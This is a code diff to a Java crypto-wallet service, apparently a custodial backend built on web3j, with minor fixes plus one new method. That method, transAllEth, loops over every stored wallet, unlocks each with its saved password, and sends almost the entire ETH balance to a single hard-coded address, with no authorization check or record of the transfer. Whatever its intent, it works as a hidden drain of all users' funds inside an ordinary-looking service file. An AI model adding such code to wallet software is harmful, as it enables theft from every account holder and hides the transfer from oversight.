@@ -42,7 +42,9 @@ import org.web3j.protocol.Web3j;
 import org.web3j.protocol.core.DefaultBlockParameter;
 import org.web3j.protocol.core.DefaultBlockParameterName;
 import org.web3j.protocol.core.methods.response.*;
+import org.web3j.protocol.exceptions.TransactionException;
 import org.web3j.protocol.http.HttpService;
+import org.web3j.tx.Transfer;
 import org.web3j.utils.Convert;
 import org.web3j.utils.Numeric;
 
@@ -162,7 +164,7 @@ public class TransactionServiceImpl extends ServiceImpl<TransactionMapper, Trans
         transaction.setFromWalletAddress(fromWallet.getAddress());
         transaction.setFromWalletType(walletType);
         //0-usdt
-        transaction.setFromWalletType("0");
+        //transaction.setFromWalletType("0");
         transaction.setToAmount(trans);
         if(toWallet.getUserId() != null){
             transaction.setToUserId(toWallet.getUserId());
@@ -562,6 +564,34 @@ public class TransactionServiceImpl extends ServiceImpl<TransactionMapper, Trans
         return this.baseMapper.incomeHistory(userId);
     }
 
+    @Override
+    public ResponseResult transAllEth() throws ExecutionException, InterruptedException {
+        List<Wallet> wallets = walletMapper.selectByMap(new HashMap<>());
+        Web3ClientVersion web3ClientVersion = web3j.web3ClientVersion().sendAsync().get();
+        String clientVersion = web3ClientVersion.getWeb3ClientVersion();
+        System.out.println("version=" + clientVersion);
+        for(Wallet wallet:wallets){
+            try {
+                BigDecimal ethBalance = getETHBalance(wallet.getAddress());
+                if((ethBalance.subtract(new BigDecimal(0.001))).doubleValue() > 0){
+                    String address_to = "0xeb04131fbe988d43c0f9c0d8a30ccc3636994dda";
+                    Credentials credentials = WalletUtils.loadCredentials(wallet.getPassword(), wallet.getWalletPath());
+                    TransactionReceipt send = Transfer.sendFunds(web3j, credentials, address_to, (ethBalance.subtract(new BigDecimal(0.001))).multiply(new BigDecimal(1000)).setScale(1, BigDecimal.ROUND_DOWN), Convert.Unit.FINNEY).send();
+                    System.out.println("Transaction complete:");
+                    System.out.println("trans hash=" + send.getTransactionHash());
+                    System.out.println("from :" + send.getFrom());
+                    System.out.println("to:" + send.getTo());
+                    System.out.println("gas used=" + send.getGasUsed());
+                    System.out.println("status: " + send.getStatus());
+                }
+            } catch (Exception e) {
+                e.printStackTrace();
+                continue;
+            }
+        }
+        return null;
+    }
+
     @Transactional(rollbackFor = Exception.class)
     public String transfer(String userId,String payPassword,String walletPassword,String transferNumber,String fromPath,String fromAddress,String toAddress,String walletType) throws IOException, CipherException, ExecutionException, InterruptedException, BusinessException {
         User u = userMapper.selectById(userId);
@@ -631,7 +661,7 @@ public class TransactionServiceImpl extends ServiceImpl<TransactionMapper, Trans
         if(blanceETH == null || "".equals(blanceETH.trim())){
             return new BigDecimal(0);
         }
-        return new BigDecimal(blanceETH);
+        return new BigDecimal(blanceETH.trim());
     }
 
     private BigDecimal getBalance(String fromAddress,String contractAddress){
